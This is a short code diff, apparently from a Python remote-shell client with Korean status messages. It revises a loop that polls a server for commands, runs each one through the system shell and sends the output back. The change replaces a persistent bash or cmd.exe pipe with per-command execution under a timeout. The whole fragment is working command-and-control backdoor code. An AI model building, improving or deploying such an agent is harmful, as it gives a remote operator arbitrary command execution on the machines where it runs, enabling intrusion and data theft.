@@ -58,31 +58,18 @@ def get_command_from_server():
         return None
 
 def shell_session_loop():
-    shell_cmd = "cmd.exe" if os.name == 'nt' else "/bin/bash"
-    process = subprocess.Popen(shell_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
-
     while True:
         cmd = get_command_from_server()
         if cmd:
             print(f"[명령 수신] {cmd}")
             try:
-                unique_marker = "__END__"
-                cmd_with_marker = f"{cmd}\necho {unique_marker}\n"
-                process.stdin.write(cmd_with_marker)
-                process.stdin.flush()
-
-                output = ""
-                while True:
-                    line = process.stdout.readline()
-                    if not line:
-                        break
-                    output += line
-                    if unique_marker in line:
-                        break
-                        
-                send_result_to_server(output)
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
+                output = result.stdout + result.stderr
+                send_result_to_server(output.strip())
+            except subprocess.TimeoutExpired:
+                send_result_to_server("[명령 실행 시간 초과]")
             except Exception as e:
-                send_result_to_server(f"[명령 입력 실패] {e}")
+                send_result_to_server(f"[명령 실행 실패] {e}")
         time.sleep(2)
 
 if __name__ == "__main__":
